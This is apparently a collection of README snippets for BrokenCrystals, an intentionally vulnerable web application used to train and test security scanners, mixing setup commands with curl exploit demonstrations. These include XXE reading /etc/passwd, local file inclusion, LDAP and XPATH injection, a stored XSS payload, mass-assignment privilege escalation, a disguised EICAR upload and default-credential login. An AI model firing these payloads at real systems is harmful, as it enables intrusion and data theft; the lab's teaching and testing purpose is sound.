[
  {
    "owner": "neuralegion",
    "repo": "brokencrystals",
    "content": "TITLE: Starting Local Dev Environment with Docker Compose (Bash)\nDESCRIPTION: This command uses Docker Compose with the `compose.local.yml` file to start the local development environment, including the application, database, and mail catcher. The `-d` flag runs the containers in detached mode, leaving them running in the background.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ndocker compose --file=compose.local.yml up -d\n\n```\n\n----------------------------------------\n\nTITLE: Rebuilding and Restarting Docker Compose Services (Bash)\nDESCRIPTION: This command rebuilds the application image, recreates the containers defined in `compose.local.yml`, and starts them in detached mode. The `--build` flag ensures the image is rebuilt, and `--force-recreate` forces recreation even if the configuration hasn't changed, useful after code changes.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ndocker compose --file=compose.local.yml up -d --build --force-recreate\n\n```\n\n----------------------------------------\n\nTITLE: Cloning Git Repository (Bash)\nDESCRIPTION: Explains the command to clone the project's Git repository from GitHub. This is the essential first step to obtain the source code and begin the local setup process. The command downloads the entire repository history.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/client/README.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/NeuraLegion/brokencrystals\n```\n\n----------------------------------------\n\nTITLE: Checking Node.js and npm Versions (Bash)\nDESCRIPTION: Describes how to verify the required Node.js version (18+) and npm version (10+) are installed on the system. This snippet uses standard command-line commands to output the current installed version of each tool for verification.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/client/README.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnode -v\nnpm -v\n```\n\n----------------------------------------\n\nTITLE: Navigating to Project Directory (Bash)\nDESCRIPTION: Shows the command to change the current working directory in the terminal to the root directory of the recently cloned project. This step is crucial as subsequent commands need to be executed from within the project folder.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/client/README.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ncd brokencrystals\n```\n\n----------------------------------------\n\nTITLE: Installing Client Dependencies with npm ci (Bash)\nDESCRIPTION: Details the command for installing the project dependencies specifically for the client application using `npm ci`. The `--prefix client` flag targets the package.json within the client subdirectory. `npm ci` is recommended for clean installs, particularly in automated environments or when ensuring dependency versions exactly match the lock file.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/client/README.md#_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nnpm ci --prefix client\n```\n\n----------------------------------------\n\nTITLE: Running Default npm Start Script (Bash)\nDESCRIPTION: Describes the command to execute the default `start` script defined in the root `package.json`. Based on the project structure, this is likely configured as an alias to start the client application. This command runs the app in development mode, accessible at `http://localhost:3001`.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/client/README.md#_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Starting Client Development Server with npm (Bash)\nDESCRIPTION: Explains the command to launch the React client application in development mode. The `npm run start` script, specific to the client package via the `--prefix client` flag, typically starts a local development server with hot-reloading. The application will then be accessible at `http://localhost:3001`.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/client/README.md#_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nnpm run start --prefix client\n```\n\n----------------------------------------\n\nTITLE: Building Production App with npm (Bash)\nDESCRIPTION: Explains the command to create a production-ready build of the client application. The `npm run build` script compiles, bundles, and optimizes all necessary assets for deployment. The resulting static files are placed in the `dist` folder.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/client/README.md#_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nnpm run build\n```\n\n----------------------------------------\n\nTITLE: Running End-to-End Tests with npm (Bash)\nDESCRIPTION: This command runs the end-to-end test script defined in the project's `package.json` file (referenced as `test:e2e`). This script is used to execute the security tests with SecTester against the application URL configured via the `SEC_TESTER_TARGET` environment variable.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nnpm run test:e2e\n\n```\n\n----------------------------------------\n\nTITLE: Serving Production Build with npm (Bash)\nDESCRIPTION: Shows the command to serve the application from the production build generated by `npm run build`. This allows for previewing the optimized production version locally before actual deployment. It simulates how the app would be served in a production environment.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/client/README.md#_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nnpm run serve\n```\n\n----------------------------------------\n\nTITLE: Running E2E Tests (Cypress GUI) with npm (Bash)\nDESCRIPTION: Details the command to execute end-to-end tests using the Cypress framework and open its interactive GUI runner. This mode is useful for developing, debugging, and visually observing tests as they execute against the application.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/client/README.md#_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nnpm run test:e2e:gui\n```\n\n----------------------------------------\n\nTITLE: Running E2E Tests (Cypress CI) with npm (Bash)\nDESCRIPTION: Explains the command to run end-to-end tests using Cypress in headless mode. This execution method is optimized for Continuous Integration (CI) pipelines, running tests without a graphical interface. Results are typically outputted to the console.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/client/README.md#_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\nnpm run test:e2e:ci\n```\n\n----------------------------------------\n\nTITLE: Running Default npm Test Script (Bash)\nDESCRIPTION: Shows the command to execute the default test script defined in the `package.json`. According to the documentation, this command is configured as an alias for `npm run test:e2e:ci`, running end-to-end tests in headless mode.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/client/README.md#_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\nnpm run test\n```\n\n----------------------------------------\n\nTITLE: Running Code Linting (ESLint) with npm (Bash)\nDESCRIPTION: Explains the command to run the ESLint linter on the project's codebase. This process analyzes the code for potential errors, stylistic issues, and deviations from established coding standards, helping maintain code quality.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/client/README.md#_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\nnpm run lint\n```\n\n----------------------------------------\n\nTITLE: Checking Code Formatting (Prettier) with npm (Bash)\nDESCRIPTION: Details the command to check the project's code formatting using the Prettier tool. This script verifies whether the code adheres to the project's configured formatting rules without automatically fixing them.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/client/README.md#_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\nnpm run format\n```\n\n----------------------------------------\n\nTITLE: Scanning JavaScript File with Retire.js Bash\nDESCRIPTION: First command downloads a specific JavaScript library file (`bootstrap.min.js`) using `curl`. The second command then uses the Retire.js tool to scan the downloaded file for known security vulnerabilities, demonstrating how to identify outdated libraries with known CVEs. Requires `curl` and `retire.js` installed.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_23\n\nLANGUAGE: bash\nCODE:\n```\n# Download the JavaScript file\n/app # curl https://brokencrystals.com/assets/vendor/bootstrap/js/bootstrap.min.js -o bootstrap.min.js\n\n# Scan the file with Retire.js\n/app # retire --js bootstrap.min.js\n```\n\n----------------------------------------\n\nTITLE: Configuring SecTester Target URL in .env (Config)\nDESCRIPTION: This line configures the `SEC_TESTER_TARGET` environment variable in the `.env` file. It specifies the URL of the application instance that SecTester will test against. In this example, it's set to the default local address `http://localhost:3000`.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_3\n\nLANGUAGE: text\nCODE:\n```\nSEC_TESTER_TARGET=http://localhost:3000\n\n```\n\n----------------------------------------\n\nTITLE: Setting Bright API Key in .env (Config)\nDESCRIPTION: This line shows how to configure the `BRIGHT_TOKEN` environment variable in the `.env` file. Replace `<your_API_key_here>` with your actual Bright API key obtained from the Bright Sec documentation. This key is required for authenticating with the Bright API when running security tests.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nBRIGHT_TOKEN=<your_API_key_here>\n\n```\n\n----------------------------------------\n\nTITLE: Creating Standard User via Curl (Bash)\nDESCRIPTION: Sends a POST request to the user creation endpoint with standard user details in the JSON body. This snippet is the initial step in the mass assignment exploitation sequence, creating a regular user account without attempting to elevate privileges.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\ncurl 'https://brokencrystals.com/api/users/basic' -X POST \\\n  -H 'Content-Type: application/json' \\\n  --data-raw '{\"email\":\"regular_user\",\"firstName\":\"John\",\"lastName\":\"Doe\",\"company\":\"Test\",\"cardNumber\":\"123\",\"phoneNumber\":\"555-1234\",\"password\":\"password123\",\"op\":\"basic\"}'\n```\n\n----------------------------------------\n\nTITLE: Querying Products API with Short Date Range (Bash curl)\nDESCRIPTION: This curl command demonstrates querying the /api/products endpoint with a short date range (1 year). It serves as a baseline to show the expected quick response time before comparing it to queries with larger date ranges. An authorization header is required.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_26\n\nLANGUAGE: bash\nCODE:\n```\ntime curl 'https://brokencrystals.com/api/products?date_from=11-04-2024&date_to=12-04-2025' \\\n-H 'authorization: YOUR_AUTH_HEADER'\n```\n\n----------------------------------------\n\nTITLE: Querying Products API with Long Date Range (Bash curl)\nDESCRIPTION: This curl command queries the /api/products endpoint using a significantly larger date range (25 years) to demonstrate the Date Manipulation vulnerability. The increased execution time compared to the short-range query highlights the performance degradation caused by processing a wide date range without proper limits. An authorization header is required.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_27\n\nLANGUAGE: bash\nCODE:\n```\ntime curl 'https://brokencrystals.com/api/products?date_from=11-04-2000&date_to=12-04-2025' \\\n-H 'authorization: YOUR_AUTH_HEADER'\n```\n\n----------------------------------------\n\nTITLE: Logging In Standard User via Curl (Bash)\nDESCRIPTION: Performs a POST request to the authentication endpoint with the standard user's credentials. The successful login response will contain an authorization token required for subsequent authenticated API calls to verify permissions.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\ncurl 'https://brokencrystals.com/api/auth/login' -X POST \\\n  -H 'Content-Type: application/json' \\\n  --data-raw '{\"user\":\"regular_user\",\"password\":\"password123\",\"op\":\"basic\"}'\n```\n\n----------------------------------------\n\nTITLE: Logging In Admin User via Curl (Bash)\nDESCRIPTION: Performs a POST request to the authentication endpoint using the credentials of the user created with the `isAdmin: true` field. The response will contain the authorization token for this user, which is then used to verify their escalated privileges.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_18\n\nLANGUAGE: bash\nCODE:\n```\ncurl 'https://brokencrystals.com/api/auth/login' -X POST \\\n  -H 'Content-Type: application/json' \\\n  --data-raw '{\"user\":\"admin_user\",\"password\":\"password123\",\"op\":\"basic\"}'\n```\n\n----------------------------------------\n\nTITLE: Verifying Admin User Permissions via Curl (Bash)\nDESCRIPTION: Makes an authenticated GET request using the token obtained for the \"admin_user\" account to the admin permission check endpoint. The expected response is `true`, confirming that the mass assignment vulnerability successfully granted administrative privileges to this user.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_19\n\nLANGUAGE: bash\nCODE:\n```\ncurl 'https://brokencrystals.com/api/users/one/admin_user/adminpermission' \\\n  -H 'authorization: eyJ0eXAiOiJKV1QiLCJhbGci...'\n```\n\n----------------------------------------\n\nTITLE: Verifying Standard User Permissions via Curl (Bash)\nDESCRIPTION: Makes an authenticated GET request using the standard user's token to the endpoint that checks for admin permissions. The expected response is `false`, confirming that the user was created without elevated privileges.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_16\n\nLANGUAGE: bash\nCODE:\n```\ncurl 'https://brokencrystals.com/api/users/one/regular_user/adminpermission' \\\n  -H 'authorization: eyJ0eXAiOiJKV1QiLCJhbGci...'\n```\n\n----------------------------------------\n\nTITLE: Fetching Uploaded File via Curl (Bash)\nDESCRIPTION: Uses curl to retrieve the file that was previously uploaded to the user's photo endpoint. The response confirms the file was successfully stored and served by the server, indicating a lack of anti-virus scanning or file content validation. Requires an authorization token.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\n$ curl -i 'https://qa.brokencrystals.com/api/users/one/admin/photo' -H 'authorization: AITH_TOKEN'\n```\n\n----------------------------------------\n\nTITLE: Uploading EICAR File via Curl (Bash)\nDESCRIPTION: Demonstrates exploiting the file upload vulnerability by sending a PUT request with multipart form data containing an EICAR test string disguised as an executable file. It aims to bypass server-side file validation and anti-virus scanning. Requires an authorization token.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\ncurl -i 'https://qa.brokencrystals.com/api/users/one/admin/photo' \\\n  -X PUT \\\n  -H 'authorization: AUTH_TOKEN' \\\n  -H 'Content-Type: multipart/form-data; boundary=--------------------------296987379026085658617195' \\\n  --data-binary $'----------------------------296987379026085658617195\\r\\nContent-Disposition: form-data; name=\"admin\"; filename=\"sample-img2ee0.exe\"\\r\\nContent-Type: image/png\\r\\n\\r\\nX5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\\r\\n----------------------------296987379026085658617195--\\r\\n'\n```\n\n----------------------------------------\n\nTITLE: Creating Admin User via Mass Assignment (Bash)\nDESCRIPTION: Sends a POST request to the user creation endpoint, including the hidden `isAdmin: true` field in the JSON body alongside other user details. This exploits the mass assignment vulnerability to grant administrative privileges to the newly created user.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_17\n\nLANGUAGE: bash\nCODE:\n```\ncurl 'https://brokencrystals.com/api/users/basic' -X POST \\\n  -H 'Content-Type: application/json' \\\n  --data-raw '{\"isAdmin\":true,\"email\":\"admin_user\",\"firstName\":\"Admin\",\"lastName\":\"User\",\"company\":\"Test\",\"cardNumber\":\"123\",\"phoneNumber\":\"555-5678\",\"password\":\"password123\",\"op\":\"basic\"}'\n```\n\n----------------------------------------\n\nTITLE: Bypassing Product Limit Constraint Bash\nDESCRIPTION: Shows two `curl` requests to the `/api/products/latest` endpoint. The first uses the default limit (3), while the second sets a high limit (`limit=1000`) to demonstrate how a business constraint (only showing latest products) can be bypassed by manipulating the limit parameter to retrieve all products without authentication.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_24\n\nLANGUAGE: bash\nCODE:\n```\n# Normal request that returns only 3 latest products\ncurl https://brokencrystals.com/api/products/latest\n\n# Bypassing the constraint to get all products without authentication\ncurl https://brokencrystals.com/api/products/latest?limit=1000\n```\n\n----------------------------------------\n\nTITLE: Exploiting Brute Force Login with Curl Bash\nDESCRIPTION: This curl command demonstrates how to test the brute force login vulnerability by attempting to log in with default weak credentials. It sends a POST request to the login endpoint with a JSON body containing the username and password, illustrating a potential exploit attempt.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://brokencrystals.com/api/auth/login \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"user\":\"admin\",\"password\":\"admin\",\"op\":\"basic\"}'\n```\n\n----------------------------------------\n\nTITLE: Storing Persistent XSS Payload with Curl Bash\nDESCRIPTION: This curl command demonstrates how to exploit the persistent XSS vulnerability in the testimonial form. It sends a POST request to the testimonials API, including an XSS payload within the message field, showing how malicious script can be injected and stored for later execution when the testimonial is viewed. It requires an AUTH_TOKEN for authentication.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\ncurl 'https://brokencrystals.com/api/testimonials' -X POST \\\n-H 'authorization: AUTH_TOKEN' \\\n-H 'Content-Type: application/json' \\\n--data-raw '{\"name\":\"Test User\",\"title\":\"Test Title\",\"message\":\"<script>alert(12345)</script>\"}'\n```\n\n----------------------------------------\n\nTITLE: Retrieving Configuration via Curl (Bash)\nDESCRIPTION: Sends a simple GET request to the `/api/config` endpoint. This demonstrates a critical vulnerability where the application exposes sensitive configuration details, including the database connection string, directly to unauthenticated users via an API endpoint.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_20\n\nLANGUAGE: bash\nCODE:\n```\ncurl http://brokencrystals.com/api/config\n```\n\n----------------------------------------\n\nTITLE: Accessing Exposed .htaccess File with Curl Bash\nDESCRIPTION: This curl command is used to directly access the .htaccess file, which is described as being publicly exposed due to a common files vulnerability. It demonstrates how an attacker can retrieve sensitive configuration details by making a simple GET request to the file's URL.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://brokencrystals.com/.htaccess\n```\n\n----------------------------------------\n\nTITLE: Accessing Mercurial Requirements Bash\nDESCRIPTION: Demonstrates how to fetch the `.hg/requires` file using `curl` to check if the Mercurial repository's requirements file is publicly accessible, potentially exposing internal configuration details of the version control system.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_21\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://brokencrystals.com/.hg/requires\n```\n\n----------------------------------------\n\nTITLE: Triggering Error with Invalid Cookie via Curl (Bash)\nDESCRIPTION: Sends a GET request to a product endpoint, intentionally setting the `bc-calls-counter` cookie to a non-numeric value. This triggers an internal server error, which, due to the vulnerability, includes the full file path where the error occurred in the response.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\ncurl -H 'Cookie:bc-calls-counter=notint;' 'https://wset--26331-12.k3s.brokencrystals.nexploit.app/api/products/latest'\n```\n\n----------------------------------------\n\nTITLE: Exploiting XXE Loading EtcPasswd Bash\nDESCRIPTION: Uses `curl` to send a crafted XML payload to the `/api/metadata` endpoint, attempting to exploit an XXE vulnerability by using an external entity to load the content of the `/etc/passwd` file from the server's filesystem. Requires a server vulnerable to XXE with external entities enabled and processing XML from the _xml_ query parameter.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_22\n\nLANGUAGE: bash\nCODE:\n```\ncurl 'https://brokencrystals.com/api/metadata' -X POST -H 'Content-Type: text/xml' \\\n --data-raw '<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE replace [<!ENTITY nexploit_xxe SYSTEM \"file://etc/passwd\">]> <root> &nexploit_xxe; </root>'\n```\n\n----------------------------------------\n\nTITLE: Exploiting LDAP Injection via Curl (Bash)\nDESCRIPTION: Makes a GET request to the LDAP endpoint with a URL-encoded query parameter. The decoded query `(&(objectClass=person)(objectClass=user)(email=*))` attempts to fetch information for all users matching these object classes and having an email address, demonstrating potential data exfiltration.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\ncurl \"https://brokencrystals.com/api/users/ldap?query=%28%26%28objectClass%3Dperson%29%28objectClass%3Duser%29%28email%3D%2A%29%29\"\n```\n\n----------------------------------------\n\nTITLE: Accessing File via LFI Endpoint Raw (Bash)\nDESCRIPTION: Sends a GET request to the `/api/file/raw` endpoint, providing a crafted path parameter (`/etc/hosts`) to retrieve the content of a sensitive file on the server. This demonstrates the Local File Inclusion vulnerability.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://brokencrystals.com/api/file/raw\\?path\\=/etc/hosts\n```\n\n----------------------------------------\n\nTITLE: Accessing File via LFI Endpoint (Bash)\nDESCRIPTION: Sends a GET request to the `/api/file` endpoint, similar to the `/raw` endpoint example, using a path parameter (`/etc/hosts`) to retrieve the content of a server file. This further demonstrates the Local File Inclusion vulnerability via a different endpoint variant.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_13\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://brokencrystals.com/api/file\\?path\\=/etc/hosts\n```\n\n----------------------------------------\n\nTITLE: Exploiting XPATH Injection in Partner Login Bash\nDESCRIPTION: Uses `curl` to send a request to the `/api/partners/partnerLogin` endpoint with a crafted password (`' or '1'='1`) designed to exploit an XPATH injection vulnerability, allowing authentication bypass and potentially access to data about other users. Targets an endpoint vulnerable to boolean-based XPATH injection.\nSOURCE: https://github.com/neuralegion/brokencrystals/blob/stable/README.md#_snippet_25\n\nLANGUAGE: bash\nCODE:\n```\n$ curl \"https://brokencrystals.com/api/partners/partnerLogin?user=anyuser&password=%27%20or%20%271%27%3D%271\"\n```"
  }
]